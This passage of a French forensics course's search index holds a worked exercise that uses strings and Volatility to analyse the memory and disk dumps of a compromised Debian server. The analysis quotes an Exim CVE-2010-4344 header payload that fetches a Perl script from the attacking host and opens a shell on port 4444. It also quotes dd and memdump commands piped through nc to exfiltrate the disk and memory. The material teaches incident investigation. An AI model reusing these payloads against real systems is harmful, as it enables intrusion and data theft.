l\u00e9gale"},{"location":"forensic/cours_forensic/#attaque-info-incidentreponse","text":"1) Valider s'il sagit d'un incident (recherches pr\u00e9liminaires). - un serveur qui perd des fichiers => peut-\u00eatre un simple bug windows ou une attaque 2) Si c'est un incident - Pr\u00e9servation des donn\u00e9es et tra\u00e7abilit\u00e9 - Recherche de preuve - Remise en ordre des ev\u00eanements 3) Rapport complet","title":"Attaque info (incident/r\u00e9ponse)"},{"location":"forensic/cours_forensic/#erreurs-a-ne-pas-faire","text":"Red\u00e9marer la machine Allumer la machine Extraire le disque dur et le brancher en externe (antivirus va scan, windows monte en lecture/\u00e9criture), monter le disque en lecture/\u00e9criture Ne pas investiguer tout de suite ! On ne travail jamais sur la preuve, on la copie puis on taff dessus.","title":"Erreurs \u00e0 ne pas faire"},{"location":"forensic/cours_forensic/#les-bonnes-pratiques","text":"Pour investiguer un disque dur il faut un HDD locker, c'est un chariot externe avec un syst\u00e8me qui emp\u00eache l'\u00e9criture sur le disque (electroniquement)","title":"Les bonnes pratiques"},{"location":"forensic/exercices/dump_mem_disk/","text":"Dump m\u00e9moire et disque dur B1- Quelle est le syst\u00e8me d'exploitation sur lequel tourne cette machine? Donner la version pr\u00e9cise. strings diskdump.img | grep linux linux-headers-2.6.26-1-486 strings exercice/dump_disk_mem/diskdump.img | grep \"GNU/Linux\" LABEL = Debian GNU/Linux 5.0.7 _Lenny_ - Official i386 NETINST Binary-1 20101128-01:05 Debian 5.0.7 Lenny | kernel version 2.6.26-1-486 B2- Donner la version pr\u00e9cise du CPU (mod\u00e8le, vitesse etc) strings exercice/dump_disk_mem/diskdump.img | grep \"CPU\" Jan 18 08:13:47 kernel: [ 0.000000] Initializing CPU#0 Jan 18 08:13:47 kernel: [ 0.099988] CPU: L2 cache: 6144K Jan 18 08:13:47 kernel: [ 0.100006] CPU: Intel(R) Core(TM)2 CPU T7200 @ 2.00GHz stepping 06 Intel code 2 Duo T7200 2.00GHZ B3 - De combien de ram dispose ce serveur? strings exercice/dump_disk_mem/diskdump.img | grep \"mem\" | less /proc/meminfo: MemTotal: 256576 kB Le serveur dispose de 256mb de m\u00e9moire vive. B4- Quels sont les processus qui tournaient sur cette machine au moment du dump? volatility --profile=LinuxDebian5010x86 -f memdump.img linux_psscan Volatility Foundation Volatility Framework 2.6 Offset Name Pid PPid Uid Gid DTB Start Time ---------- -------------------- --------------- --------------- --------------- ------ ---------- ---------- 0x0e972240 exim4 2078 - 101 103 0xf000e987 - 0x0e972660 rsyslogd 1661 - 0 0 ---------- - 0x0e972a80 exim4 2167 - 0 103 0xf000e987 - 0x0e972ea0 rsyslogd 1663 - 0 0 ---------- - 0x0e9732c0 sleep 2083 - 101 103 0xf000e987 - 0x0e9736e0 sh 2080 - 101 103 0xf000e987 - 0x0e973b00 rpc.statd 1441 - 102 0 ---------- - 0x0e978200 run-parts 2166 - 0 0 0xf000e987 - 0x0e978620 kpsmoused 1110 - 0 0 0xf000e987 - 0x0e978a40 rsyslogd 2162 - 0 0 0xf000e987 - 0x0e978e60 hostname 2165 - 0 0 0xf000e987 - 0x0e979280 dhclient-script 2163 - 0 0 0xf000e987 - 0x0e9796a0 portmap 1429 - 1 1 ---------- - 0x0e979ac0 sshd 1687 - 0 0 ---------- - 0x0f42e040 khelper 7 - 0 0 0xf000e987 - 0x0f42e460 events/0 6 - 0 0 0xf000e987 - 0x0f42eca0 ksoftirqd/0 4 - 0 0 0xf000e987 - 0x0f42f4e0 kthreadd 2 - 0 0 0xf000e987 - 0x0f42f900 init 1 - 0 0 ---------- - 0x0f43e080 scsi_eh_0 634 - 0 0 0xf000e987 - 0x0f43e4a0 sshd 2157 - 0 0 0xf000e987 - 0x0f43e8c0 nc 2169 - 0 0 ---------- - 0x0f43ece0 acpid 1672 - 0 0 ---------- - 0x0f43f100 pdflush 123 - 0 0 0xf000e987 - 0x0f43f520 aio/0 126 - 0 0 0xf000e987 - 0x0f43f940 modprobe 1061 - 0 0 0xf000e987 - 0x0f45c0c0 kjournald 700 - 0 0 0xf000e987 - 0x0f45c4e0 ksuspend_usbd 581 - 0 0 0xf000e987 - 0x0f45c900 dhclient3 1624 - 0 0 ---------- - 0x0f45cd20 exim4 1942 - 101 103 ---------- - 0x0f45d140 kacpi_notify 42 - 0 0 0xf000e987 - 0x0f45d560 kswapd0 125 - 0 0 0xf000e987 - 0x0f45d980 pdflush 124 - 0 0 0xf000e987 - 0x0f46c100 nc 2161 - 0 0 0xf000e987 - 0x0f46c520 rsyslogd 1664 - 0 0 ---------- - 0x0f46c940 kseriod 86 - 0 0 0xf000e987 - 0x0f46cd60 getty 1998 - 0 0 ---------- - 0x0f46d180 dd 2160 - 0 0 0xf000e987 - 0x0f46d5a0 udevd 776 - 0 0 ---------- - 0x0f46d9c0 ata/0 594 - 0 0 0xf000e987 - 0x0f48c140 chown 2061 - 0 103 0xf000e987 - 0x0f48c560 getty 1992 - 0 0 ---------- - 0x0f48c980 run-parts 2096 - 0 0 0xf000e987 - 0x0f48cda0 sh 2095 - 0 0 0xf000e987 - 0x0f48d1c0 khubd 582 - 0 0 0xf000e987 - 0x0f48d5e0 cron 2094 - 0 0 0xf000e987 - 0x0f48da00 exim4 2084 - 101 103 0xf000e987 - 0x0f4a0180 getty 2000 - 0 0 ---------- - 0x0f4a05a0 udevd 1055 - 0 0 0xf000e987 - 0x0f4a09c0 rsyslogd 2030 - 0 0 0xf000e987 - 0x0f4a0de0 rsyslogd 2155 - 0 0 0xf000e987 - 0x0f4a1200 kacpid 41 - 0 0 0xf000e987 - 0x0f4a1620 getty 1996 - 0 0 ---------- - 0x0f4a1a40 kblockd/0 39 - 0 0 0xf000e987 - 0x0f8021c0 bash 2042 - 0 0 ---------- - 0x0f8025e0 rsyslogd 2068 - 0 0 0xf000e987 - 0x0f802a00 ata_aux 595 - 0 0 0xf000e987 - 0x0f802e20 sshd 2100 - 103 65534 0xf000e987 - 0x0f803240 getty 1994 - 0 0 ---------- - 0x0f803660 rsyslogd 2087 - 0 0 0xf000e987 - 0x0f803a80 cron 1973 - 0 0 ---------- - 0x0f42e880 watchdog/0 5 - 0 0 0xf000e987 - 0x0f42f0c0 migration/0 3 - 0 0 0xf000e987 - 0x0faac280 memdump 2168 - 0 0 ---------- - 0x0faac6a0 rsyslogd 2159 - 0 0 0xf000e987 - 0x0faacac0 sshd 2153 - 0 0 0xf000e987 - 0x0faacee0 sh 2065 - 0 0 ---------- - 0x0faad300 sh 2150 - 101 103 0xf000e987 - 0x0faad720 login 1990 - 0 0 ---------- - 0x0faadb40 sshd 2154 - 103 65534 0xf000e987 - B5- Quelle est l'adresse IP du PC? volatility --profile=LinuxDebian5010x86 -f memdump.img linux_route_cache Volatility Foundation Volatility Framework 2.6 Interface Destination Gateway ---------------- -------------------- ------- lo 192.168.56.102 192.168.56.102 eth0 192.168.56.1 192.168.56.1 eth0 192.168.56.1 192.168.56.1 L'IP de la machine est : 192.168.56.102 B6- Quels sont les ports en \u00e9coute, dans quel \u00e9tat sont ils? volatility --profile=LinuxDebian5010x86 -f memdump.img linux_netstat Volatility Foundation Volatility Framework 2.6 UNIX 2190 udevd/776 UDP 0.0.0.0 : 111 0.0.0.0 : 0 portmap/1429 TCP 0.0.0.0 : 111 0.0.0.0 : 0 LISTEN portmap/1429 UDP 0.0.0.0 : 769 0.0.0.0 : 0 rpc.statd/1441 UDP 0.0.0.0 :38921 0.0.0.0 : 0 rpc.statd/1441 TCP 0.0.0.0 :39296 0.0.0.0 : 0 LISTEN rpc.statd/1441 UDP 0.0.0.0 : 68 0.0.0.0 : 0 dhclient3/1624 UNIX 5069 dhclient3/1624 UNIX 4617 rsyslogd/1661 /dev/log UNIX 4636 acpid/1672 /var/run/acpid.socket UNIX 4638 acpid/1672 TCP :: : 22 :: : 0 LISTEN sshd/1687 TCP 0.0.0.0 : 22 0.0.0.0 : 0 LISTEN sshd/1687 TCP :: : 25 :: : 0 LISTEN exim4/1942 TCP 0.0.0.0 : 25 0.0.0.0 : 0 LISTEN exim4/1942 UNIX 5132 login/1990 TCP 192.168.56.102 :43327 192.168.56.1 : 4444 ESTABLISHED sh/2065 TCP 192.168.56.102 :43327 192.168.56.1 : 4444 ESTABLISHED sh/2065 TCP 192.168.56.102 :43327 192.168.56.1 : 4444 ESTABLISHED sh/2065 TCP 192.168.56.102 : 25 192.168.56.101 :37202 CLOSE sh/2065 TCP 192.168.56.102 : 25 192.168.56.101 :37202 CLOSE sh/2065 TCP 192.168.56.102 :56955 192.168.56.1 : 8888 ESTABLISHED nc/2169 B7- Quelle est l'adresse IP de l'attaquant? Le service exim4 \u00e9coute sur le port 25, on voit 2 connexion \u00e0 l'\u00e9tat CLOSE . On voit aussi 4 connexions \"ESTABLISHED\" vers 192.168.56.1 sur les ports 4444 et 8888 (\u00e9tabli avec netcat). Il y a de forte chance pour que 192.168.56.1 soit la machine attaquante. Mais je suspecte 192.168.56.101 d'avoir initier la premi\u00e8re connexion. B8- Quel(s) service(s) a(ont) \u00e9t\u00e9 exploit\u00e9(s) par l'attaquant en vue de prendre le contr\u00f4le du serveur? A quoi sert/servent ce(s) service(s)? TCP 192.168.56.102 : 25 192.168.56.101 :37202 CLOSE sh/2065 TCP 192.168.56.102 : 25 192.168.56.101 :37202 CLOSE sh/2065 Une connexion sur un shell a \u00e9t\u00e9 faite, allons voir ce qu'il s'est pass\u00e9. volatility --profile=LinuxDebian5010x86 -f memdump.img linux_bash Pid Name Command Time Command -------- -------------------- ------------------------------ ------- 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-base 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-daemon-light 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -l | grep exim 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-config 2042 bash 2011-02-06 14:04:39 UTC+0000 ls -a 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg --purge 2042 bash 2011-02-06 14:04:39 UTC+0000 pwd 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -l | grep exim 2042 bash 2011-02-06 14:04:39 UTC+0000 mkdir exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-config_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 cd exim4/ 2042 bash 2011-02-06 14:04:39 UTC+0000 scp yom@192.168.56.1:/home/yom/temporary/exmi4/* . 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-base_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-base_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i --ignore-depends=exim4-base,exim4-daemon-light exim4_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 /etc/init.d/networking restart 2042 bash 2011-02-06 14:04:39 UTC+0000 ifconfig 2042 bash 2011-02-06 14:04:39 UTC+0000 /etc/init.d/networking start 2042 bash 2011-02-06 14:04:39 UTC+0000 halt 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install openssh-server 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install openssh-server 2042 bash 2011-02-06 14:04:39 UTC+0000 cd /etc/exim4/ 2042 bash 2011-02-06 14:04:39 UTC+0000 scp yom@192.168.56.1:/home/yom/temporary/exim4/* . 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-daemon-light_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 cd .. 2042 bash 2011-02-06 14:04:39 UTC+0000 ls 2042 bash 2011-02-06 14:04:39 UTC+0000 rm -rf exim4/ 2042 bash 2011-02-06 14:04:39 UTC+0000 vi .bash 2042 bash 2011-02-06 14:04:39 UTC+0000 vi .ssh/known_hosts 2042 bash 2011-02-06 14:04:39 UTC+0000 vi .bash_history 2042 bash 2011-02-06 14:04:39 UTC+0000 vi update-exim4.conf.conf 2042 bash 2011-02-06 14:04:39 UTC+0000 update-exim4.conf 2042 bash 2011-02-06 14:04:39 UTC+0000 halt 2042 bash 2011-02-06 14:04:39 UTC+0000 reboot 2042 bash 2011-02-06 14:04:39 UTC+0000 whereis gcc 2042 bash 2011-02-06 14:04:39 UTC+0000 whereis memdump 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install memdump 2042 bash 2011-02-06 14:04:39 UTC+0000 halt 2042 bash 2011-02-06 14:04:39 UTC+0000 ifconfig 2042 bash 2011-02-06 14:04:39 UTC+0000 ping 192.168.56.1 2042 bash 2011-02-06 14:04:39 UTC+0000 mount 2042 bash 2011-02-06 14:04:39 UTC+0000 sudo dd if=/dev/sda | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 dd if=/dev/sda | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 dd if=/dev/sda1 | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install memdump 2042 bash 2011-02-06 14:04:39 UTC+0000 netstat -ant 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install ddrescue 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install dcfldd 2042 bash 2011-02-06 14:04:39 UTC+0000 ls /dev/kmem 2042 bash 2011-02-06 14:04:39 UTC+0000 ls /dev/mem 2042 bash 2011-02-06 14:04:39 UTC+0000 halt 2042 bash 2011-02-06 14:04:39 UTC+0000 ifconfig 2042 bash 2011-02-06 14:04:39 UTC+0000 ifconfig 2042 bash 2011-02-06 14:04:39 UTC+0000 reboot 2042 bash 2011-02-06 14:04:46 UTC+0000 ifconfig 2042 bash 2011-02-06 14:24:43 UTC+0000 dd if=/dev/sda1 | nc 192.168.56.1 8888 2042 bash 2011-02-06 14:42:29 UTC+0000 memdump | nc 192.168.56.1 8888 On peut voir que beaucoup de choses ont \u00e9t\u00e9 faites : changer la version d'exim 4 par : exim4-base_4.69-9_i386.deb installation d'openssh : apt-get install openssh-server => pas de sudo devant apt-get, on peut supposer que l'utilisateur \u00e9tait en root . scp yom@192.168.56.1:/home/yom/temporary/exim4/* . => yom est l'utilisateur depuis le PC attaquant install\u00e9 un outil pour dump la m\u00e9moire dumper /dev/sda et /dev/sda1 via netcat \u00e0 l'adresse : 192.168.56.1 initier des connexions scp et netcat sur les ports 4444 et 8888. Si on regarde du c\u00f4t\u00e9 des process volatility --profile=LinuxDebian5010x86 -f memdump.img linux_pslist_cache Offset Name Pid PPid Uid Gid DTB Start Time ---------- -------------------- --------------- --------------- --------------- ------ ---------- ---------- 0xcf45c0c0 kjournald 700 2 0 0 ---------- 2011-02-06 12:04:18 UTC+0000 0xcf45c4e0 ksuspend_usbd 581 2 0 0 ---------- 2011-02-06 12:04:14 UTC+0000 0xcf45c900 dhclient3 1624 1 0 0 0x0ec3d000 2011-02-06 12:04:39 UTC+0000 0xcf45cd20 exim4 1942 1 101 103 0x0e7bc000 2011-02-06 12:04:44 UTC+0000 0xcf45d140 kacpi_notify 42 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf45d560 kswapd0 125 2 0 0 ---------- 2011-02-06 12:04:10 UTC+0000 0xcf45d980 pdflush 124 2 0 0 ---------- 2011-02-06 12:04:10 UTC+0000 0xcf42e040 khelper 7 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42e460 events/0 6 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42e880 watchdog/0 5 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42eca0 ksoftirqd/0 4 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42f0c0 migration/0 3 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42f4e0 kthreadd 2 0 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42f900 init 1 0 0 0 0x0f4b8000 2011-02-06 12:04:09 UTC+0000 0xcfaac280 memdump 2168 2042 0 0 0x08088000 2011-02-06 14:42:27 UTC+0000 0xcfaacee0 sh 2065 1 0 0 0x0f517000 2011-02-06 14:07:15 UTC+0000 0xcfaad720 login 1990 1 0 0 0x0eecf000 2011-02-06 12:04:45 UTC+0000 0xcf4a0180 getty 2000 1 0 0 0x0e89e000 2011-02-06 12:04:45 UTC+0000 0xcf4a1200 kacpid 41 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf4a1620 getty 1996 1 0 0 0x0f838000 2011-02-06 12:04:45 UTC+0000 0xcf4a1a40 kblockd/0 39 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xce972660 rsyslogd 1661 1 0 0 0x0e7ed000 2011-02-06 12:04:40 UTC+0000 0xce972ea0 rsyslogd 1663 1 0 0 0x0e7ed000 2011-02-06 12:04:40 UTC+0000 0xce973b00 rpc.statd 1441 1 102 0 0x0f8b3000 2011-02-06 12:04:35 UTC+0000 0xce978620 kpsmoused 1110 2 0 0 ---------- 2011-02-06 12:04:27 UTC+0000 0xce9796a0 portmap 1429 1 1 1 0x0eddf000 2011-02-06 12:04:35 UTC+0000 0xce979ac0 sshd 1687 1 0 0 0x0fa65000 2011-02-06 12:04:41 UTC+0000 0xcf46c520 rsyslogd 1664 1 0 0 0x0e7ed000 2011-02-06 12:04:40 UTC+0000 0xcf46c940 kseriod 86 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf46cd60 getty 1998 1 0 0 0x0f83d000 2011-02-06 12:04:45 UTC+0000 0xcf46d5a0 udevd 776 1 0 0 0x0f5b2000 2011-02-06 12:04:21 UTC+0000 0xcf46d9c0 ata/0 594 2 0 0 ---------- 2011-02-06 12:04:15 UTC+0000 0xcf8021c0 bash 2042 1990 0 0 0x0eecc000 2011-02-06 14:04:38 UTC+0000 0xcf802a00 ata_aux 595 2 0 0 ---------- 2011-02-06 12:04:15 UTC+0000 0xcf803240 getty 1994 1 0 0 0x0f671000 2011-02-06 12:04:45 UTC+0000 0xcf803a80 cron 1973 1 0 0 0x0f815000 2011-02-06 12:04:45 UTC+0000 0xcf48c560 getty 1992 1 0 0 0x0ea31000 2011-02-06 12:04:45 UTC+0000 0xcf48d1c0 khubd 582 2 0 0 ---------- 2011-02-06 12:04:14 UTC+0000 0xcf43e080 scsi_eh_0 634 2 0 0 ---------- 2011-02-06 12:04:17 UTC+0000 0xcf43e8c0 nc 2169 2042 0 0 0x08084000 2011-02-06 14:42:27 UTC+0000 0xcf43ece0 acpid 1672 1 0 0 0x0f8a8000 2011-02-06 12:04:40 UTC+0000 0xcf43f100 pdflush 123 2 0 0 ---------- 2011-02-06 12:04:10 UTC+0000 0xcf43f520 aio/0 126 2 0 0 ---------- 2011-02-06 12:04:10 UTC+0000 On retrouve les process : exim4 => service mail memdump => permet de dumper la m\u00e9moire nc => \u00e9tablire des connexions sshd => service open-ssh B9 - En vous basant sur les deux dumps, donner la CVE la plus probable exploit\u00e9e par l'attaquant Le service exim4-base_4.69-9_i386.deb \u00e0 \u00e9t\u00e9 install\u00e9, il \u00e9coute sur le port 25. Allons voir si des CVEs existent : https://www.cvedetails.com/cve/CVE-2010-4344/ Heap-based buffer overflow in the string_vformat function in string.c in Exim before 4.70 allows remote attackers to execute arbitrary code via an SMTP session that includes two MAIL commands in conjunction with a large message containing crafted headers, leading to improper rejection logging. Allons voir les logs des mails pour confirmer notre hypoth\u00e8se : sudo mount -o ro,loop norecovery diskdump.img /mnt/forensic sudo su cd /mnt/forensic/var/log/exim4/ #cat rejectlog | less Header0052: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV Header0053: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV Header0054: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV Header0055: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV HeaderX: ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 1 92.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} On observe un maxi payload et l'ouverture d'un shell, bingo ! C'est notre CVE-2010-4344 ! B10- Est-ce que l'attaquent a r\u00e9ussi a voler des donn\u00e9es? Oui l'attaquant a r\u00e9ussis \u00e0 dumper /dev/sda1 et la m\u00e9moire 2042 bash 2011-02-06 14:24:43 UTC+0000 dd if=/dev/sda1 | nc 192.168.56.1 8888 2042 bash 2011-02-06 14:42:29 UTC+0000 memdump | nc 192.168.56.1 8888 On voit que 20 minutes se sont \u00e9coul\u00e9s encotre les deux commandes, le temps de la copie de /dev/sda vers 192.168.56.1 . B11- Certaines actions entreprises par l'attaquent n'ont pas abouties, lesquelles? Beaucoup d'actions n'ont pas abouties, on observe de multiples tentatives : Il tente de supprimer exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-base 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-daemon-light 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -l | grep exim 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-config 2042 bash 2011-02-06 14:04:39 UTC+0000 ls -a 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg --purge 2042 bash 2011-02-06 14:04:39 UTC+0000 pwd 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -l | grep exim 2042 bash 2011-02-06 14:04:39 UTC+0000 mkdir exim4 plusieurs tentatives pour installer la version 4.69-9 de exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-config_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 cd exim4/ 2042 bash 2011-02-06 14:04:39 UTC+0000 scp yom@192.168.56.1:/home/yom/temporary/exmi4/* . 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-base_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-base_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i --ignore-depends=exim4-base,exim4-daemon-light exim4_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4_4.69-9_all.deb Lance \u00e0 deux reprises l'installation d'open-ssh 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install openssh-server 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install openssh-server Plusieurs tentative de dumper avec dd . 2042 bash 2011-02-06 14:04:39 UTC+0000 mount 2042 bash 2011-02-06 14:04:39 UTC+0000 sudo dd if=/dev/sda | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 dd if=/dev/sda | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 dd if=/dev/sda1 | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install memdump B12- Question bonus: que pr\u00e9coniseriez vous au propri\u00e9taire de ce serveur pour renforcer la s\u00e9curit\u00e9 face a ce type d'attaque? Mettre \u00e0 jour les services, surveiller les CVEs Mise en place de s\u00e9curit\u00e9 comme un IDS/IPS Pratiquer des tests d'intrusions Mettre en place une supervision des postes avec des r\u00e8gles.","title":"Dump m\u00e9moire et disque dur"},{"location":"forensic/exercices/dump_mem_disk/#dump-memoire-et-disque-dur","text":"","title":"Dump m\u00e9moire et disque dur"},{"location":"forensic/exercices/dump_mem_disk/#b1-quelle-est-le-systeme-dexploitation-sur-lequel-tourne-cette-machine-donner-la-version-precise","text":"strings diskdump.img | grep linux linux-headers-2.6.26-1-486 strings exercice/dump_disk_mem/diskdump.img | grep \"GNU/Linux\" LABEL = Debian GNU/Linux 5.0.7 _Lenny_ - Official i386 NETINST Binary-1 20101128-01:05 Debian 5.0.7 Lenny | kernel version 2.6.26-1-486","title":"B1- Quelle est le syst\u00e8me d'exploitation sur lequel tourne cette machine? Donner la version pr\u00e9cise."},{"location":"forensic/exercices/dump_mem_disk/#b2-donner-la-version-precise-du-cpu-modele-vitesse-etc","text":"strings exercice/dump_disk_mem/diskdump.img | grep \"CPU\" Jan 18 08:13:47 kernel: [ 0.000000] Initializing CPU#0 Jan 18 08:13:47 kernel: [ 0.099988] CPU: L2 cache: 6144K Jan 18 08:13:47 kernel: [ 0.100006] CPU: Intel(R) Core(TM)2 CPU T7200 @ 2.00GHz stepping 06 Intel code 2 Duo T7200 2.00GHZ","title":"B2- Donner la version pr\u00e9cise du CPU (mod\u00e8le, vitesse etc)"},{"location":"forensic/exercices/dump_mem_disk/#b3-de-combien-de-ram-dispose-ce-serveur","text":"strings exercice/dump_disk_mem/diskdump.img | grep \"mem\" | less /proc/meminfo: MemTotal: 256576 kB Le serveur dispose de 256mb de m\u00e9moire vive.","title":"B3 - De combien de ram dispose ce serveur?"},{"location":"forensic/exercices/dump_mem_disk/#b4-quels-sont-les-processus-qui-tournaient-sur-cette-machine-au-moment-du-dump","text":"volatility --profile=LinuxDebian5010x86 -f memdump.img linux_psscan Volatility Foundation Volatility Framework 2.6 Offset Name Pid PPid Uid Gid DTB Start Time ---------- -------------------- --------------- --------------- --------------- ------ ---------- ---------- 0x0e972240 exim4 2078 - 101 103 0xf000e987 - 0x0e972660 rsyslogd 1661 - 0 0 ---------- - 0x0e972a80 exim4 2167 - 0 103 0xf000e987 - 0x0e972ea0 rsyslogd 1663 - 0 0 ---------- - 0x0e9732c0 sleep 2083 - 101 103 0xf000e987 - 0x0e9736e0 sh 2080 - 101 103 0xf000e987 - 0x0e973b00 rpc.statd 1441 - 102 0 ---------- - 0x0e978200 run-parts 2166 - 0 0 0xf000e987 - 0x0e978620 kpsmoused 1110 - 0 0 0xf000e987 - 0x0e978a40 rsyslogd 2162 - 0 0 0xf000e987 - 